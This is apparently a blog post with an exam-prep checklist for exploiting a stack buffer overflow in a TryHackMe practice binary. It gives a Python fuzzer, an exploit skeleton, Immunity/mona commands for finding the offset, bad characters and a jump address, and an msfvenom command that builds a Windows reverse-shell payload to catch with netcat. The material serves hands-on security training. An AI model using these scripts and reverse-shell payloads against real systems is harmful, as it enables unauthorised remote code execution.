---
layout: post
title:  "Buffer Overflow Checklist"
date:   2021-01-21 20:07:19
categories: [Checklist,oscp-prep,BOF]
comments: true

---

I prepared these checklist from this Amazing THM Room. Thanks to the creator
https://tryhackme.com/room/bufferoverflowprep

<!--more-->

### Step 1 (Initial Set up):
 
* Run the immunity debugger as Administrator
* File --> Open --> "Load the BOF Binary"
* Debug --> Run/Restart
* Connect to the vulnerable bof from Kali linux and understand how the binary works
`nc <remotemachine> port`
* Configure Mona working directory to the current directory
`!mona config -set workingfolder c:\mona\%p`

### Step 2 (Fuzz)

* Run fuzz.py
```
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n") # Add the prefix here. Look at the required space
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```
* When you see the `Could not connect to the Machine`, then note the largest byte sent.

### Step 3 (EIP Control):

* Create exploit.py
```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

* Create pattern, by giving 400 byte extra to the byte that we found during step2.
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`
* Put output for the above in `payload` variable
* Rerun the debugger and execute exploit.py
* Once the application crash, execute the below command in mona to find EIP offset (give length as given in pattern create)
`!mona findmsp -distance 600`
* Update the offset variable
* Empty the payload variable
* Update retn value with BBBB
* Restart the binary and you will notice the value of B in EIP


### Step 4 (Finding Bad Characters):

* Create bytearray bin in Mona by excluding Bad characters. /x00 by default a bad character
`!mona bytearray -b "\x00"`
* Create bytearray
```
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```
* Set the result to the payload variable
* Restart the binary and run exploit.py
* Once crashed, execute the below to know further bad characters
`!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>`
* Make note of bad characters, add to the bytearray bin and remove the badcharacters from the bytearray payload.
* Repeat the above process till get "Unmodified" while comparing with ESP address


### Step 5 (Finding Jump point)

* Update -cbp flag with all bad characters found from the step 4
`!mona jmp -r esp -cpb "\x00"`
* The above command return all the address of ESP that does not contain any bad characters
* Choose any ESP address and update it in reverse order in the retn Variable


### Step 6 (Generating Payload)

* `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py `
* Tweak the code by replacing payload to buf

* Set the padding 16 or more `padding = "\x90" * 16` in the exploit code
* Spwan a nc listner and run the exploit!




